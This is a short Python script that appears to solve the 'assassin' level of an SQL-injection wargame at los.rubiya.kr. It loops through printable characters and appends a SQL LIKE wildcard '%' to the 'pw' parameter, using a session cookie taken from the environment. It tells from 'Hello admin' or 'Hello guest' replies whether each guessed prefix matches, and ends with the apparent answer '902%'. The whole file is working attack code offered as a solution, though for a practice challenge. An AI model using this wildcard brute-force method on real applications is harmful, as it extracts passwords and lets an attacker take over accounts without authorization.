import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookie = {"PHPSESSID": os.getenv('PHPSESSID')}
pw = ""

a = string.printable
a = a[:-38]

for i in range(8):
    guestPW = ""
    for j in a:
        res = requests.get(base_url, params={
            'pw': f"{pw + j}%"}, cookies=cookie)
        print(res.url.split("?")[1])
        res = res.text
        if "Hello admin" in res:
            print(f"done[{i}]: {j}")
            break
        elif "Hello guest" in res:
            print(f"guest[{i}]: {j}")
            guestPW = j
    pw += guestPW
print(pw)

#! 902%
